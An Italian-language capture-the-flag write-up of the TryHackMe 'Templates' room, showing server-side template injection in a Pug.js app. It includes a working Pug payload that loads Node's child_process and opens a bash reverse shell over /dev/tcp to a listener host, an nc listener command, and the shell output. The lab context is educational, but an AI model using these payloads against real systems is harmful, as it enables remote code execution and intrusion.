
#tryhackmelabs #laboratorio #cms

https://tryhackme.com/room/templates

Il mio cane preferito è il carlino... e, sapete cosa? È anche il mio motore di template preferito! Ho creato questa applicazione super intuitiva, così potete sperimentare con il carlino e vedere come funziona. Davvero, potete fare un sacco di cose con il carlino!

Dai un'occhiata a contenuti simili su TryHackMe:

[SSTI](https://tryhackme.com/room/learnssti)

apriamo l'indirizzo
```
http://10.10.209.141:5000/
```

```
pug.js
```
come suggerito dovrebbe essere vulnerabile a SSTI proviamo
```
#{ 7 * 7 }
```
```
<49></49>
```
restituisce 49 quindi è vulnerabile e dovrebbe essere NodeJS
ora  proviamo
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('whoami')}()}
```
dopo aver provato diversi payload trovati in rete https://book.hacktricks.xyz/ senza riscontro proviamo ad ottentere direttamente una reverse shell

ci mettiamo in ascolto con
```
nc -nlvp 4444
```
ed inviamo il seguente payload
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('bash -c "sh -i >& /dev/tcp/10.10.118.99/4444 0>&1"')}()}
```

otteniamo una reverse shell!
```
ls
```

```
cat flag.txt
```

```
root@ip-10-10-118-99:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.209.141 57384
sh: 0: can't access tty; job control turned off
$ ls
app.js
flag.txt
node_modules
package-lock.json
package.json
views
$ cat flag.txt
flag{xxxxxxxxxxxxxx}$ 
```

https://tryhackme.com/room/prioritise
https://tryhackme.com/room/hfb1heist
https://tryhackme.com/room/whyhackme
https://tryhackme.com/room/breakrsa
https://tryhackme.com/room/supersecrettip




